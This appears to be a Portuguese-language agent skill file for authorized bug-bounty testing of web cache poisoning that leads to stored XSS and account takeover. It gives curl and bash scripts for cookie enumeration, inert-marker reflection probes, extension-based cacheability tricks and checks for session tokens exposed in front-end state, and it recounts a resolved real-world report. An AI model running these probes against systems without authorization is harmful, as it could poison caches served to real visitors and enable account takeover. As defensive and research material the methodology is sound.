---
name: cache-poisoning-xss
description: Metodologia de Web Cache Poisoning levando a XSS armazenado e account takeover, para bug bounty e pentest autorizado. Use SEMPRE que houver reflexão de input não-chaveado (cookie, header, query) no corpo de uma resposta cacheável — especialmente respostas .js, .css, .json ou HTML que embutem valores em variáveis JavaScript (var x="valor") — e sempre que o usuário mencionar "cache poisoning", "XSS via cache", "unkeyed input", "X-Forwarded-Host", "cookie refletido", "poisoning de CDN", "takeover via cache". A ideia central é que a chave de cache é método+host+path+headers do Vary, então cookies e headers NÃO entram na chave: um valor que muda a resposta sem mudar a chave fica salvo no cache e é servido a TODOS os visitantes. FLUXO OBRIGATÓRIO EM 3 FASES, nesta ordem: (1) enumerar os cookies que a PRÓPRIA APLICAÇÃO define — nunca um nome fixo — restringindo o teste a páginas que respondem Content-Type: text/html, e rodando TODO o fluxo nos DOIS estados (autenticado e não autenticado), já que cada estado seta cookies diferentes e renderiza blocos diferentes, sendo a lista final a união dos dois; (2a) varrer com canário alfanumérico inofensivo (xandsz1, xandsz2...) em lote para descobrir QUAIS cookies refletem no HTML e em que contexto — sem nenhum metacaractere; (2b) só nos cookies que refletiram, enviar o marcador '"></xandsz> UM COOKIE POR VEZ, cada um com cache buster próprio, verificando se ele reflete EXATAMENTE assim em QUALQUER PARTE do corpo HTML, não só dentro de <script>; (3) verificar se o PRÓPRIO MARCADOR cacheia — requisição à mesma URL sem cookie nenhum recebendo o marcador de volta, com Age>0 / X-Cache: HIT; se não cachear, RETRY OBRIGATÓRIO anexando extensão estática ao path e repetindo o teste de cache, pois CDNs costumam cachear por extensão — usando APENAS .js, .css e .jpg, nada além, para economizar requisições. ATENÇÃO: a AUSÊNCIA de headers de cache (CF-Cache-Status, X-Cache, Age, Cache-Control, Vary) NÃO invalida o achado — proxies internos e CDNs com headers removidos armazenam sem anunciar; a prova é COMPORTAMENTAL: se o marcador voltou numa requisição sem cookie nenhum, veio do cache. A skill NUNCA envia payload executável: o único valor enviado é o marcador inerte '"></xandsz>, e o marcador cacheado já é a prova completa do poisoning; o XSS que seria possível é apenas descrito no report. PROGRESSÃO AUTOMÁTICA: se a condição de uma fase bate, avança sozinho para a próxima sem pedir confirmação. DEDUPLICAÇÃO OBRIGATÓRIA: mantém registro tested.csv chaveado por TEMPLATE (não por URL) + cookie + estado, nunca reteste o mesmo par, não reteste outra URL do mesmo template, só reteste em template novo o cookie que já provou refletir em algum lugar, e descarta de vez o cookie sem reflexão em 3 templates. A skill SALVA A POC em disco e ALERTA o usuário em cada nível de sinal (reflexão exata, reflexão parcial, poisoning confirmado). Não usa nem ensina técnicas de bypass de WAF: o único valor enviado é o marcador simples. Cobre: o probe do marcador, leitura da reflexão parcial (o que o servidor remove e o que passa), como tornar a resposta cacheável anexando extensão (.js, .css, .jpeg), bypass de HttpOnly quando a sessão está em clear text em window.INITIAL_STATE, uso OBRIGATÓRIO de cache buster ALEATÓRIO (?cb=$RANDOM$RANDOM) em TODA requisição, com e sem extensão — nunca testar direto na URL de produção, porque a entrada real pode já estar envenenada/suja por outra pessoa ou rodada anterior (falso positivo) e porque o que se cacheia sem buster é servido a usuários reais (dano); mesmo buster dentro de um ciclo, buster NOVO ao trocar de cookie, extensão, estado ou página; nada de cb fixo tipo ?cb=1, e como reportar. Só usar dentro do escopo formalmente autorizado.
---

# Web Cache Poisoning → XSS Armazenado → Account Takeover

Metodologia para transformar uma reflexão de input não-chaveado numa resposta
cacheável em XSS servido a **todos os visitantes** da página.

**Pré-condição obrigatória**: só use dentro do escopo formalmente autorizado.

**REGRA DE OURO DESTA SKILL — cache buster sempre.** Envenenar uma URL real
afeta usuários reais. Todo teste roda numa chave de cache isolada
(`?cachebuster=<aleatório>`). Ver seção 6. Quem testa sem buster está atacando
os usuários do programa, não demonstrando um bug.

## 1. A ideia central — input não-chaveado

A chave de cache é tipicamente:

```
   chave = método + host + path + query + (headers listados em Vary)
```

**Cookies e a maioria dos headers NÃO entram na chave.** Então existe uma classe
de input que:

- **muda a resposta** (é refletido no corpo), mas
- **não muda a chave** (o cache acha que é a mesma página)

```
   atacante envia   Cookie: hav=<payload>   ->  resposta envenenada
                    (mesmo path, mesma chave)         |
                                                      v
                                            cache SALVA essa resposta
                                                      |
   vítima visita a URL normal, sem cookie nenhum  ->  recebe o payload
```

Diferente do `web-cache-auth-leak` (onde o dado da vítima vaza para o
atacante), aqui o fluxo é **atacante → vítimas**: é ataque de **integridade**,
não de confidencialidade. E diferente de Cache Deception, a vítima não precisa
ser induzida a nada — ela acessa a URL normal.

## 2. Escopo — onde testar

**Regra de escopo: só páginas que respondem `Content-Type: text/html`.**
Antes de qualquer teste, confirme:

```bash
curl -sI "$URL" | grep -i '^content-type:'
# precisa conter text/html
```

Se a resposta for `application/json`, `application/javascript`, `text/css` ou
imagem, **pule** — não entra na rodada. (A variante de resposta `.js` existe e
foi o caso original da seção 8, mas ela é uma **escalada** da seção 5, não o
ponto de partida.)

**O input a testar são os cookies da PRÓPRIA APLICAÇÃO** — não um nome fixo
qualquer. O `hav` do caso real era um cookie específico daquele alvo; no seu
alvo os nomes serão outros. A fase 1 da seção 3 enumera quais são.

O contexto de reflexão mais explorável é o valor caindo dentro de JavaScript
embutido no HTML:

```html
<script>
  var hav = "valor vindo do cookie";
  window.config = { user: "valor" };
</script>
```

Basta fechar a string ou a tag `</script>` para sair para HTML.

Headers não-chaveados também valem como input, depois de esgotar os cookies:

```
X-Forwarded-Host    X-Forwarded-Scheme    X-Forwarded-Proto
X-Host              X-Original-URL        X-Rewrite-URL
X-Forwarded-For     Referer               Origin
```

## 3. Fluxo de detecção — três fases, nesta ordem

Não pule fase e não inverta a ordem. Cada fase só roda se a anterior deu sinal,
e isso evita disparar payload em alvo que nem reflete.

### Fase 1 — Enumerar os cookies que a aplicação define

```bash
CB="?cb=$RANDOM$RANDOM"
URL="https://alvo.com/pagina$CB"

# confirma que e text/html
curl -sI "$URL" | grep -i '^content-type:' | grep -qi 'text/html' || echo "FORA DE ESCOPO"

# coleta os cookies que a propria aplicacao seta
curl -s -c jar.txt "https://alvo.com/" -o /dev/null
awk '!/^#/ && NF {print $6}' jar.txt > cookies.txt
cat cookies.txt
```

Navegue um pouco pela aplicação (home, busca, listagem, login) para colher o
conjunto completo — vários cookies só aparecem em fluxos específicos. Some a
esses quaisquer nomes de cookie que apareçam no JavaScript da aplicação
(`document.cookie`, bibliotecas de cookie), que a skill `bughunter` extrai.

#### Rodar nos DOIS estados: autenticado e não autenticado

**Todo o fluxo roda duas vezes — com sessão e sem sessão.** Não escolha um dos
dois; os resultados divergem e cada estado revela coisa diferente:

- **Cookies diferentes existem em cada estado.** Autenticado, a aplicação seta
  cookies de preferência, idioma, moeda, último item visto, carrinho,
  personalização — que anônimo nunca recebe. A lista de candidatos é a **união**
  dos dois estados.
- **A página pode renderizar blocos diferentes.** Um trecho que embute o valor
  do cookie em `<script>` pode só existir na versão logada.
- **O tratamento do valor pode mudar.** O mesmo cookie pode ser escapado num
  template e não no outro.

```bash
# estado ANONIMO
curl -s -c jar_anon.txt "https://alvo.com/" -o /dev/null
awk '!/^#/ && NF {print $6}' jar_anon.txt > cookies_anon.txt

# estado AUTENTICADO (faca login e exporte a sessao para jar_auth.txt)
curl -s -b jar_auth.txt -c jar_auth.txt "https://alvo.com/" -o /dev/null
awk '!/^#/ && NF {print $6}' jar_auth.txt > cookies_auth.txt

# lista final = uniao dos dois
sort -u cookies_anon.txt cookies_auth.txt > cookies.txt
```

Ao rodar a fase 2 em cada estado, use **cache buster próprio por estado** para
que um não contamine a chave do outro.

**A verificação de cache (fase 3) é SEMPRE anônima**, nos dois casos — a vítima
do poisoning é um visitante qualquer. O estado autenticado serve para
**injetar**; a prova é sempre a requisição sem cookie nenhum.

Se a reflexão só ocorrer autenticado **mas a resposta envenenada for servida a
anônimos**, o achado é mais forte, não mais fraco: o atacante usa a própria
conta para envenenar e a vítima nem precisa estar logada. Deixe isso explícito
no report.

### Fase 2 — Descobrir quais cookies refletem, depois marcar um por vez

Duas etapas, nesta ordem. A etapa **2a** é uma varredura barata e inofensiva; a
**2b** só toca nos cookies que provaram refletir.

#### Fase 2a — Canário benigno: QUAIS cookies refletem no HTML

Valor puramente alfanumérico, único por cookie, **sem nenhum metacaractere** —
não corrompe o HTML e não desperta WAF. Tudo num request só:

```bash
CB="?cb=$RANDOM$RANDOM"
URL="https://alvo.com/pagina$CB"

i=0; COOKIES=""
while read c; do
  i=$((i+1)); COOKIES="${COOKIES}${c}=xandsz${i}; "
done < cookies_a_testar.txt

curl -s -H "Cookie: $COOKIES" "$URL" -o resp.html
grep -oaE 'xandsz[0-9]+' resp.html | sort -u
```

Cada `xandsz<n>` encontrado mapeia de volta para a linha `n` da lista — esse é
um cookie refletido. **Se nada aparecer, pare a página aqui**: sem reflexão não
há vetor, e o marcador nem chega a ser enviado.

Anote, para cada acerto, **a linha do HTML** onde caiu (contexto: dentro de
`<script>`, em atributo, ou em texto).

#### Fase 2b — Marcador `'"></xandsz>` nos que refletiram, UM POR VEZ

Só nos cookies confirmados na 2a. **Um cookie por request, cache buster próprio
para cada** — nunca vários marcadores no mesmo HTML.

```bash
while read c; do
  CB="?cb=$RANDOM$RANDOM"                 # chave de cache NOVA por cookie
  U="https://alvo.com/pagina$CB"
  curl -s -H "Cookie: ${c}='\"></xandsz>" "$U" -o "iso_${c}.html"

  if grep -qaF "'\"></xandsz>" "iso_${c}.html"; then
    echo "[EXATO]   $c"
    grep -naF "'\"></xandsz>" "iso_${c}.html" | head -3
  elif grep -qa 'xandsz' "iso_${c}.html"; then
    echo "[PARCIAL] $c"
    grep -na 'xandsz' "iso_${c}.html" | head -3
  else
    echo "[nada]    $c"
  fi
  sleep 1
done < cookies_que_refletiram.txt
```

**A busca é pela string exata, em qualquer lugar do corpo HTML** — não só
dentro de `<script>`. Pode cair em atributo, texto, comentário, `<meta>`,
`<title>` ou JSON embutido. Qualquer ocorrência conta.

**Leitura do resultado:**

| O que voltou | Conclusão |
|---|---|
| `'"></xandsz>` **exatamente** | Nenhum tratamento. Vá para a fase 3. |
| `&#39;&quot;&gt;&lt;/xandsz&gt;` | HTML-encoded. Sem vetor. Registre e pare. |
| `\'\"></xandsz>` | JS-escaped. Sem vetor. Registre e pare. |
| `'></xandsz>` (sumiu o `"`) | Filtro parcial, `<>` intactos — ver 3.1. Continue. |
| `'"></xandsz` (sumiu o `>`) | Filtro parcial; sem `>` não há para onde ir. |
| `xandsz` sem os metacaracteres | Reflete, mas filtra tudo. Registre e pare. |

**Por que um por vez:** marcadores sobrepostos corrompem o HTML e o parser
quebra, uma reflexão pode esconder a outra, você perde a atribuição do contexto,
e o volume de metacaracteres aumenta a chance de bloqueio. O lote existe só na
2a, onde o valor é inofensivo.

Priorize os candidatos: reflexão dentro de `<script>` primeiro, depois
atributo, depois texto HTML.

### Fase 3 — Verificar se o marcador CACHEIA

**Nenhum payload executável, em nenhum momento.** A confirmação é feita com o
próprio marcador `'"></xandsz>`: se ele — inerte — chega a um visitante que não
mandou cookie nenhum, o poisoning está provado. Um XSS real não acrescenta
prova, só risco.

```bash
# 1) envenenar a chave: manda o marcador no cookie que refletiu
curl -s -H "Cookie: NOME_DO_COOKIE='\"></xandsz>" "$URL" -o env.html

# 2) MESMA URL, SEM COOKIE NENHUM — este e o teste que fecha o bug
curl -s "$URL" -o limpo.html -D h.txt
grep -naF "'\"></xandsz>" limpo.html
grep -iE '^(age|x-cache|cf-cache-status|x-served-by):' h.txt
```

**Leitura:**

| Resultado | Conclusão |
|---|---|
| marcador aparece em `limpo.html` + `Age > 0` / `X-Cache: HIT` | **POISONING CONFIRMADO** |
| marcador aparece mas **sem header de cache** | **Vale igual** — ver aviso abaixo |
| marcador **não** aparece sem cookie | Ainda não cacheia — **vá para o retry abaixo** |

Confirmação extra: peça a alguém em **outra rede** para abrir a URL e procurar
`xandsz`. POPs de CDN são distribuídos — mesma lógica da skill
`web-cache-auth-leak`.

**⚠ Ausência de header de cache NÃO invalida o achado.** Proxies reversos
internos, CDNs com headers de debug removidos e camadas de cache caseiras
armazenam sem anunciar nada — sem `CF-Cache-Status`, sem `X-Cache`, sem `Age`,
sem `Cache-Control`. Os headers são **atalho de diagnóstico**, não a prova.

A prova é **comportamental**: se o marcador voltou numa requisição que não
mandou cookie nenhum, ele veio do cache — ponto. Nesse caso, reforce a
confirmação repetindo mais vezes e testando de outra rede, já que você não tem
o `HIT` para se apoiar, e registre no report que o cache não emite headers.

#### Retry obrigatório — forçar cacheabilidade com extensão

Se o marcador refletiu mas **não** voltou na requisição sem cookie, não
descarte ainda. Repita a fase 3 anexando extensão estática ao path — CDNs
costumam cachear por extensão (detalhes na seção 4).

**Apenas três extensões: `.js`, `.css`, `.jpg`** — são as que cobrem os casos
reais e economizam requisição. Não gaste request com `.png`, `.svg`, `.woff`,
`.map` e afins.

```bash
for EXT in .js .css .jpg; do
  CB="?cb=$RANDOM$RANDOM"
  U="https://alvo.com/pagina${EXT}${CB}"
  curl -s -H "Cookie: ${COOKIE}='\"></xandsz>" "$U" -o /dev/null   # envenena
  curl -s "$U" -o "limpo${EXT}.html" -D "h${EXT}.txt"               # SEM cookie
  if grep -qaF "'\"></xandsz>" "limpo${EXT}.html"; then
    echo "[CACHEOU com $EXT]"
    grep -iE '^(age|x-cache|cf-cache-status):' "h${EXT}.txt"
  fi
  sleep 1
done
```

Foi assim no caso real: `.php` não cacheava, mas `.php.js` e `.php.jpeg` sim.
Só descarte depois que as três extensões falharem — aí sim é apenas Self-XSS
via cookie.

**O que vai no report:** o marcador cacheado é a prova completa. Descreva o
payload que *seria* possível a partir daquele contexto, mas **não o envie** — a
seção 9 mostra como escrever isso.

### 3.1 Lendo a reflexão parcial

Quando o marcador volta **incompleto**, ele diz exatamente quais caracteres o
servidor remove ou escapa — e portanto o que sobraria para trabalhar:

```
enviado:  '"></xandsz>
voltou:   '></xandsz>      -> o servidor removeu as aspas duplas
                              as tags < > passaram intactas
```

Registre o que sumiu no `tested.csv` e no report. Reflexão parcial com `<` e
`>` intactos ainda é sinal relevante e segue para a fase 3 (teste de cache);
reflexão que perde `<` e `>` não tem para onde ir — registre e passe adiante.

### 3.2 Progressão automática — se a condição bate, segue

Quando a condição de uma fase é satisfeita, **avance sozinho para a próxima**.
Não pare para pedir confirmação, não reporte só o sinal parcial e espere ordem.

```
reflete o marcador EXATO           ->  testa se o marcador CACHEIA (fase 3)
reflete PARCIAL com <> intactos    ->  registra o que sumiu e segue (fase 3)
marcador volta SEM cookie          ->  poisoning confirmado, ALERTA (seção 7.1)
```

As únicas coisas que interrompem a marcha:

- **Falta de cache buster** — nunca prossiga sem ele.
- Alvo **fora do escopo** autorizado.
- Qualquer situação que exigiria enviar payload executável — a skill não envia.

Fora isso, roda a cadeia inteira e só chama o usuário quando tiver algo
conclusivo — reflexão exata, reflexão parcial com o que foi filtrado, ou
poisoning confirmado.

### 3.3 Controle de estado — não repetir teste já feito

Cada request gasto num cookie já testado é request à toa e ruído no alvo.
Mantenha um registro do que já foi probado:

```bash
# tested.csv:  template | cookie | estado | resultado
echo "template,cookie,estado,resultado" > tested.csv
# ...alimentar a cada probe:
echo "/annonces/*.php,hav,anon,EXATO" >> tested.csv
```

**Chaveie por TEMPLATE, não por URL.** `/annonces/paris_75_dt0.php` e
`/annonces/lyon_69_dt0.php` são a mesma página renderizada com dados
diferentes — testar as duas é desperdício. Normalize substituindo o que varia:

```
/annonces/france_midi-pyrenees_46_stcere_dt0.php   ->   /annonces/*.php
/user/12345/profile                                 ->   /user/*/profile
```

**Regras de decisão:**

| Situação | Ação |
|---|---|
| Mesmo template + mesmo cookie + mesmo estado | **Nunca repetir** |
| Mesmo template, outra URL (só muda o dado) | **Não retestar** — é a mesma página |
| Template novo, cookie que **já refletiu** em algum lugar | **Retestar** — o escape muda de template para template |
| Template novo, cookie que nunca refletiu em nenhum template | Testar só na 1ª e 2ª vez |
| Cookie sem reflexão em **3 templates diferentes** | **Descartar** da lista definitivamente |
| Mesmo cookie, estado diferente (anon ↔ auth) | **Testar** — conta como probe distinto |

O caso que **vale a pena** retestar num template novo é o do cookie que já
provou refletir em algum lugar: o mesmo valor pode ser escapado numa view e não
em outra. Esse é o candidato que se carrega adiante. Os que nunca refletiram vão
sendo podados, e a lista encolhe a cada página.

Antes de rodar a fase 2 numa página nova, filtre:

```bash
TEMPLATE="/annonces/*.php"
while read c; do
  grep -q "^${TEMPLATE},${c},${ESTADO}," tested.csv && continue   # ja testado
  grep -q ",${c},.*,DESCARTADO$" tested.csv && continue           # podado
  echo "$c"
done < cookies.txt > cookies_a_testar.txt
```

Se `cookies_a_testar.txt` sair vazio, **pule a página inteira** — não há nada
novo a aprender ali.

## 4. Tornar a resposta cacheável

Se a resposta que reflete não é cacheável, muitas vezes dá para forçar.
Anexe uma extensão estática ao path — CDNs costumam cachear por extensão:

```
/pagina.php            -> não cacheado
/pagina.php.js         -> cacheado   (foi o caso real)
/pagina.php.css
/pagina.php.jpg        -> extensão de imagem também funcionou no caso real
```

**Só essas três extensões** — `.js`, `.css`, `.jpg`. Cobrem os casos observados
e mantêm o volume de requisições baixo.

Depois de anexar, confirme pelos headers que virou cacheável (`Age`,
`X-Cache: HIT`, `Cache-Control: public`). Se a extensão é aceita e a resposta
ainda reflete o input, você tem os dois ingredientes.

## 5. Cache buster — sempre, aleatório, com ou sem extensão

```bash
CB="?cb=$RANDOM$RANDOM"
URL="https://alvo.com/pagina$CB"                 # sem extensao
UX="https://alvo.com/pagina.js$CB"               # com extensao (retry da fase 3)
```

O parâmetro entra na chave de cache, então você envenena **só a sua chave**.

**Três razões, e as duas primeiras são as que mais custam se ignoradas:**

1. **A página real pode já estar envenenada ou suja.** Testando direto na URL
   de produção você pode estar lendo uma entrada preenchida por outra pessoa,
   por uma rodada anterior sua, ou por tráfego qualquer. Concluiria "refletiu!"
   sobre um estado que não foi você que criou — **falso positivo**. Com buster
   novo, a chave é sua: o que aparecer nela foi você quem pôs.
2. **Sem buster, o que você cacheia é servido a usuários reais.** Isso deixa de
   ser demonstração e vira ataque. Buster isola.
3. Permite repetir o ciclo quantas vezes quiser sem esperar TTL de chave suja.

**Quando trocar o buster:**

```
mesmo cb   ->  dentro de um mesmo ciclo (envenenar + validar sem cookie)
cb NOVO    ->  ao trocar de cookie testado
cb NOVO    ->  ao trocar de extensão no retry
cb NOVO    ->  ao trocar de estado (anônimo <-> autenticado)
cb NOVO    ->  ao trocar de página
cb NOVO    ->  ao repetir uma rodada já feita
```

**Aleatório de verdade.** Nada de `?cb=1`, `?cb=123` ou valor fixo — outra
pessoa testando o mesmo alvo usa exatamente esses, e você herda o cache dela.
Use `$RANDOM$RANDOM` ou equivalente.

**Vale igual com e sem extensão.** O retry da fase 3 (`.js`, `.css`, `.jpg`)
leva buster do mesmo jeito, e buster novo a cada extensão — a extensão muda o
path, mas não isola a chave sozinha.

Outras regras:

- Buster **em todo** request de teste, inclusive nos de confirmação.
- Se precisar provar que a URL real também é vulnerável, use **apenas** o
  marcador `'"></xandsz>`, que é inerte, e deixe expirar. Melhor ainda: prove na
  URL com buster e explique no report que a URL real tem o mesmo comportamento.
- Nunca deixe nada cacheado numa URL real ao terminar. Se envenenou sem querer,
  avise o programa imediatamente.

## 6. Escalada — de XSS a account takeover

XSS sozinho já é achado. O que eleva para takeover:

**Sessão em clear text no estado do front.** Mesmo com o cookie de sessão
marcado `HttpOnly` (inacessível via `document.cookie`), muitas aplicações
duplicam a sessão dentro do payload de hidratação:

```javascript
window.INITIAL_STATE.system.cookie
window.__INITIAL_STATE__.auth.token
window.__NEXT_DATA__.props.pageProps.session
```

Se o XSS fosse executado na mesma página que carrega esse objeto, o
`HttpOnly` seria irrelevante — o script leria a variável diretamente. No caso
real foi exatamente isso que fechou o takeover.

**Você não precisa executar nada para documentar isso.** A verificação é uma
leitura passiva da página (comando abaixo). No report, descreva a cadeia:
marcador cacheado + sessão em clear text no mesmo documento = takeover
possível.

**Como verificar sem executar payload:** basta abrir a página normalmente e
procurar o objeto:

```bash
curl -s "https://alvo.com/pagina" | grep -oE 'INITIAL_STATE[^<]{0,400}' | head
```

Se a sessão estiver ali em texto claro, documente — é o que transforma um XSS
em takeover no report, e você descobre isso sem disparar nada.

## 7. Caso real que originou esta skill

**Alvo:** `www.abritel.fr` (Expedia Group Bug Bounty). Reportado por *bombon*
em 02/11/2022. Resolvido.

**Título:** *I was able to Takeover Accounts Via Cache Poisoning (XSS)*

Quatro fatores combinados:

**1) Cookie refletido numa resposta `.js`**

O cookie `hav` era refletido no corpo de
`https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js`:

```javascript
var hav="value from cookie"
```

**2) Filtro parcial do servidor**

O servidor tinha uma proteção que "escondia" (removia) aspas duplas, **mas não
fazia isso com os sinais de maior e menor (`<>`)** — o que permitiu fechar a tag
`<script>`.

**3) Sem escape das tags**

Como o servidor não tratava `<` e `>`, era possível fechar a tag `<script>` e
sair do contexto JavaScript para HTML — que é a condição que torna a reflexão
explorável.

**4) A resposta era cacheável**

O servidor tratava `...php.js` como resposta cacheável, portanto o valor
refletido do cookie ficava salvo naquela página — e **qualquer usuário que
visitasse a URL era XSSado**. A variante `.php.jpeg` também funcionou.

**O que fechou o takeover:** o cookie de sessão era `HttpOnly`, porém na mesma
página havia uma variável JS chamada `window.INITIAL_STATE.system.cookie` com a
sessão **em texto claro** — acessível a qualquer script rodando naquele
documento, tornando o `HttpOnly` irrelevante.

**Passos para reproduzir (do report original):**

```http
GET /annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd HTTP/2
Host: www.abritel.fr
Cookie: hav=<valor refletido>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Te: trailers
```

Depois, em **outro navegador**, visitar a URL — e o XSS dispara.

Repare no `?xxxd`: é o cache buster, isolando a chave de cache do teste.

**Correção do time:** pararam de refletir o `hav`.

**Nota de processo:** o programa tentou fechar como duplicado de outro report
("As this relies on the same root cause, we will be closing it as duplicate"),
mas o pesquisador argumentou que o vetor era distinto. Vale contestar
fechamento por duplicidade quando a causa raiz ou o vetor realmente diferem.

**Lições transferíveis:**

- Reflexão de **cookie** é subestimada — o desenvolvedor confia no cookie e
  injeta direto no template.
- Filtro parcial não é proteção: se `<` e `>` passam, a reflexão é explorável
  mesmo que as aspas sejam removidas.
- Extensão anexada (`.php.js`, `.php.jpeg`) é o que torna a resposta cacheável.
- `HttpOnly` não protege nada se a sessão está duplicada no estado do front.

## 7.1 Saída obrigatória — salvar a PoC e alertar

Sempre que uma fase der sinal, **salve a evidência em disco e avise o usuário
na hora** — não deixe o achado só no scroll do terminal.

**Salvar a PoC:**

```bash
OUT="poc_cache_poisoning_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT"
cp resp.html   "$OUT/2_marcador_refletido.html"
cp env.html    "$OUT/3_marcador_enviado.html"
cp limpo.html  "$OUT/4_sem_cookie_com_marcador.html"
cp h.txt       "$OUT/4_headers_cache.txt"
cat > "$OUT/poc.txt" <<EOF
URL:      $URL
COOKIE:   NOME_DO_COOKIE
MARCADOR: '"></xandsz>
CONTEXTO: <linha do HTML onde refletiu>
CACHE:    <valor de Age / X-Cache na requisicao sem cookie>
EOF
```

**Alertar o usuário**, com o nível do sinal explícito:

- `REFLEXÃO EXATA` — o marcador voltou intacto no HTML. Ainda não é o bug
  completo, mas é o pré-requisito. Avise e siga para a fase 3.
- `REFLEXÃO PARCIAL` — diga **qual caractere sumiu**, porque é ele que vira a
  o que o servidor filtra (seção 3.1).
- `POISONING CONFIRMADO` — a requisição sem cookie recebeu o conteúdo
  envenenado. Alerta forte: informe a URL, o cookie, o header de cache que
  provou o HIT, e onde a PoC foi salva.

Nunca reporte "confirmado" sem a requisição sem cookie ter retornado o
conteúdo. Reflexão sozinha é Self-XSS, não poisoning.

## 8. Reportar

1. Mostre a resposta **sem** o input (baseline) e **com** o input refletido.
2. Mostre a terceira requisição — **sem cookie nenhum** — recebendo o conteúdo
   envenenado, com os headers de cache (`Age`, `X-Cache: HIT`). Essa é a prova
   de que é poisoning e não só reflexão.
3. Explique a chave de cache: por que o input não entra nela.
4. Se usou marcador benigno, diga isso — mostra teste responsável e não deixa
   payload ativo. Descreva o payload real que **seria** possível, sem tê-lo
   cacheado na URL de produção.
5. Documente a variável de sessão em clear text separadamente — ela justifica a
   escalada para takeover.
6. Remediação: incluir o input na chave de cache ou não refleti-lo; escapar a
   saída no contexto correto; `Cache-Control: private` onde couber; e remover a
   sessão do estado do front.

## 9. Checklist

- [ ] Cache buster único em **todos** os requests de teste.
- [ ] Escopo respeitado: só páginas com `Content-Type: text/html`.
- [ ] Fluxo rodado nos DOIS estados: autenticado e não autenticado, com cache buster próprio por estado.
- [ ] Lista de cookies = união dos cookies dos dois estados.
- [ ] Cookies enumerados a partir da PRÓPRIA aplicação (fase 1), não nomes fixos.
- [ ] Fase 2a: canário alfanumérico em lote para achar os cookies que refletem.
- [ ] Fase 2b: marcador `'"></xandsz>` só nos que refletiram, UM POR VEZ, buster próprio.
- [ ] Busca por reflexão exata feita em **qualquer parte** do corpo HTML, não só em `<script>`.
- [ ] Candidatos priorizados pelo contexto (dentro de `<script>` primeiro).
- [ ] Não cacheou? Retry com **apenas** `.js` / `.css` / `.jpg` antes de descartar.
- [ ] Sem header de cache não foi tratado como ausência de bug — prova comportamental vale.
- [ ] Contexto da reflexão anotado antes de montar payload (script/atributo/texto).
- [ ] NENHUM payload executável enviado — só o marcador `'"></xandsz>`, em todas as fases.
- [ ] Progressão automática respeitada: condição batida = avança sem esperar ordem (3.2).
- [ ] Registro `tested.csv` mantido, chaveado por TEMPLATE (não por URL) + cookie + estado.
- [ ] Nenhum cookie retestado no mesmo template/estado; cookies sem reflexão em 3 templates descartados.
- [ ] PoC salva em disco e usuário alertado com o nível do sinal (seção 7.1).
- [ ] Reflexão parcial analisada e registrada: o que sumiu, o que passou (3.1).
- [ ] Confirmado que a resposta é cacheável (`Age`, `X-Cache`, `Cache-Control`).
- [ ] Terceira requisição **sem cookie** recebe o conteúdo envenenado.
- [ ] Confirmado de outra rede/IP, se possível.
- [ ] Procurado objeto de sessão em clear text no estado do front.
- [ ] Nada além do marcador inerte deixado em cache ao final do teste.
- [ ] Testadas também as outras classes de cache no mesmo endpoint
      (`web-cache-auth-leak`, Cache Deception).
